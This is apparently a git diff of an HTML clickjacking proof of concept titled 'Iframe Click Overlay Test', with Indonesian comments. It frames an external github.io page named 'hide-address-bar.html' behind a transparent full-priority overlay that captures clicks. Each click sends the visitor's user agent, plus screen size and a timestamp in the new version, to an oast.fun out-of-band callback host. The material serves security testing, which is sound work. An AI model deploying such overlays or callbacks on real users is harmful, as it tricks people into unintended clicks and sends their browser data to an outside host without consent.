@@ -1,12 +1,57 @@
-<iframe src="https://sauceialist.github.io/justwanna/hide-address-bar.html" sandbox="allow-scripts allow-top-navigation" width="100%" height="400" style="border:none;"></iframe>
-<div onclick="installClick()" style="position:fixed;top:150px;left:50px;width:300px;height:100px;background:transparent;z-index:9999;"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Iframe Click Overlay Test</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #f4f4f4;
+    }
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+    }
+    .click-catcher {
+      position: fixed;
+      top: 100px;
+      left: 50px;
+      width: 300px;
+      height: 200px;
+      background: rgba(255, 255, 255, 0); /* transparan */
+      z-index: 9999;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
 
-<script>
-function installClick() {
-  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/pwa-click', {
-    method: 'POST',
-    body: JSON.stringify({ clicked: true, ua: navigator.userAgent }),
-    headers: { 'Content-Type': 'application/json' }
-  });
-}
-</script>
+  <!-- Iframe ke halaman deploy milikmu -->
+  <iframe 
+    src="https://sauceialist.github.io/justwanna/hide-address-bar.html" 
+    sandbox="allow-scripts allow-same-origin" 
+    id="payload-iframe">
+  </iframe>
+
+  <!-- Area transparan yang meng-capture klik -->
+  <div class="click-catcher" onclick="logClick()"></div>
+
+  <script>
+    function logClick() {
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/iframe-click', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event: 'iframe_overlay_clicked',
+          ua: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timestamp: Date.now()
+        })
+      }).then(() => console.log("Click sent")).catch(console.error);
+    }
+  </script>
+
+</body>
+</html>
